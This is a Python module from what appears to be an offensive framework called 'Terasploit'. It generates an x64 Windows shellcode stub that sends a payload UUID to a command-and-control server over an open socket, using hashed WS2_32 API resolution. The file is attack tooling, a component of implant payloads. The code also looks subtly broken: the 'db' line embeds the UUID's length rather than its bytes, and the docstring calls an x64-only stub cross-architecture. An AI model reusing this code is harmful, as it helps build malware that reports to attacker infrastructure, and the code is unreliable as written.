"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            teralibs/tsf/core/payload/windows/x64/send_uuid_x64.py
"""

from teralibs.tsf.core.payload.uuid.options import PayloadUUIDOptions
from teralibs.tsf.core.payload.windows.x64.block_api_x64 import BlockApiX64


class SendUUIDX64(BlockApiX64, PayloadUUIDOptions):
    """
    Implements a cross-architecture NASM stub to transmit a unique
    payload identifier (UUID) to the C2 server over an existing socket.
    """

    def asm_send_uuid(self, uuid=None):
        """
        Generates assembly code to send a UUID over a socket using the Windows WS2_32 'send' API.
        """
        if uuid is None:
            uuid = self.generate_payload_uuid()

        uuid_raw = uuid.to_raw()
        uuid_len = len(uuid_raw)

        asm = f"""
            send_uuid:
                xor r9, r9                          ; flags

                ; length of the UUID
                push {uuid_len}

                pop r8
                call get_uuid_address               ; put uuid buffer on the stack

                db {hex(len(uuid.to_raw()))}

            get_uuid_address:
                pop rdx                             ; UUID address
                mov rcx, rdi                        ; Socket handle

                mov r10d, {self.block_api_hash("ws2_32.dll", "send")}

                call rbp                            ; call send
        """
        return asm

    @staticmethod
    def uuid_required_size() -> int:
        """
        Returns the byte requirements for this stub.
        """
        # 16 bytes for UUID + instruction overhead
        return 64
